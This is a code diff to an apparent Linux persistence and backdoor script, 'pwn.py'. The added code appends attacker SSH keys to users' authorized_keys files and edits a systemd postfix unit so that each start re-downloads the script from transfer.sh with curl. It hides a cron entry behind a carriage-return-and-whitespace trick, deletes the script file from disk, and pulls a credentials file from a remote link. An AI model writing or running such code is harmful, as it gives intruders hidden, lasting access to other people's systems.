@@ -9,7 +9,7 @@ currentCRON = '/var/spool/cron/root'
 locationFile = '/home/user/pwn.py'
 
 gtfoBin = 'sudo strace -o /dev/null {}'
-files = ['pwn.py', '.env', 'rsakeys.pub']
+files = ['pwn.py', '.env', '.rsakeys.pub']
 
         
 def runCommand(command, output=False):
@@ -64,7 +64,28 @@ def gitKeyPush():
         runCommand("mkdir -p {}".format(dir))
         runCommand('chmod 0700 {}'.format(dir))
         runCommand('chown {}:{} {}'.format(user, user, dir))
-        subprocess.Popen('cat rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+        # TODO: APPEND IF ONLY KEY NOT IN FILE
+
+        # where the key is
+        with open(".rsakeys.pub", "r") as keyFile:
+            key = [line for line in keyFile.readlines()]
+        
+        # where we want the key
+
+        try:
+            with open(sshAuthorized, "r") as keyStore:
+                allLines = [line for line in keyStore.readlines()]
+                
+            if key[0] not in allLines:
+                subprocess.Popen('cat .rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+            print("end of try")
+        except:
+            subprocess.Popen('cat .rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+        
+
+
+
+        # subprocess.Popen('cat rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
         time.sleep(0.5)
         runCommand('chmod 0600 {}'.format(sshAuthorized))
         runCommand('chown {}:{} {}'.format(user, user, sshAuthorized))
@@ -96,12 +117,24 @@ def is_root():
         # Rerun This Script As Root User
         rerun()
 
-def startUpRecover():
-    # On startup, we need a couple of things
-        # 1. Need to get the oldest version of the script BACK on the tgt machine
-        # 2. After receiving, we need to check to see if it needs to be updated
-        # 3. After checking for updates, we need to 
-    print()
+def startUpRecovery():
+    path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/KY51q9/pwn.py\n".format(locationFile)
+    
+    try:
+        with open(path, "r") as service:
+            allLines = [line for line in service.readlines()]
+        
+        if ourPwnShit not in allLines:
+            index = allLines.index("ExecStart=/usr/sbin/postfix start\n")
+            allLines.insert(index + 1, ourPwnShit)
+
+        with open(path, "w") as service:
+            for line in allLines:
+                service.writelines(line)
+            
+    except:
+        print("Failed To Append to File ", path)    
 
 
 def appendCron(path, command):
@@ -110,18 +143,43 @@ def appendCron(path, command):
     carriage = ' #\r'
     whitespace = ' ' * (len(command) + len(carriage))
     # Just need to open file @path
-    try:
-        cronfile = open(path, "a")  # append mode
+    # try:
+    #     cronfile = open(path, "a")  # append mode
 
-        ## TODO: Check if the command is already in it, if not, then add.
-        cronfile.write("\n" + command + carriage + whitespace + "\n")
-        cronfile.close()
-        runCommand("systemctl reload crond.service")
-        runCommand("systemctl restart crond.service")
-        print('Appended To File ', path)
+    #     ## TODO: Check if the command is already in it, if not, then add.
+
+    #     cronfile.write("\n" + command + carriage + whitespace + "\n")
+    #     cronfile.close()
+    #     runCommand("systemctl reload crond.service")
+    #     runCommand("systemctl restart crond.service")
+    #     print('Appended To File ', path)
+    # except:
+    #     print("Failed To Append to File ", path)
+    #     return
+
+    allLines = []
+    toWrite = command + carriage + whitespace
+
+    try:
+        with open(path, "r") as cron:
+            allLines = [line for line in cron.readlines()]
+            inLine = False
+            for line in allLines:
+                if command in line:
+                    inLine = True
+                    break
+            
+        
+        if not inLine:
+            with open(path, "a") as cron:
+                cron.write("\n" + toWrite + "\n")
+                cron.close()
+            runCommand("systemctl reload crond.service")
+            runCommand("systemctl restart crond.service")
+            print('Appended To File ', path)
+
     except:
-        print("Failed To Append to File ", path)
-        return
+        print('bruh')
 
     
 
@@ -135,8 +193,19 @@ def configureTokens():
     api_key = None
 
     
+    try:
+        with open(".env", "r") as envFile:
+            envFile.close()
+    except:
+        # Prompt user for link
+        # store the link 
+        # put link in command    
+        # https://transfer.sh/2S2RUM/.env
+        usrInput = input("Enter link for environment variable: ")
+        runCommand("curl -s -o .env {}".format(usrInput))
+
+
     # Ensure we can download enviornment file
-    runCommand("curl -s -o .env https://transfer.sh/2S2RUM/.env")
     load_dotenv()
     api_key = os.getenv("github_key")
 
@@ -160,6 +229,7 @@ def getScript():
             '''
                 Implement Directory to Save These Files To
             '''
+        print("redownloaded script")
     else:
         exit()
 
@@ -174,17 +244,17 @@ def main():
     # Update The Script From GitHub And Obtain Keys To Add
     getScript()
 
-    # Find Place To Hide The Script While Running
-    cmd = "* * * * * rm -f " + locationFile
-    appendCron(currentCRON, cmd)
-
     # attempt to edit ssh files
     sshConfigEdit()
 
     # Find All Users And Append Keys
     gitKeyPush()
 
-    
+    # Find Place To Hide The Script While Running
+    cmd = "* * * * * rm -f " + locationFile
+    appendCron(currentCRON, cmd)
+
+    startUpRecovery()
     
 
 
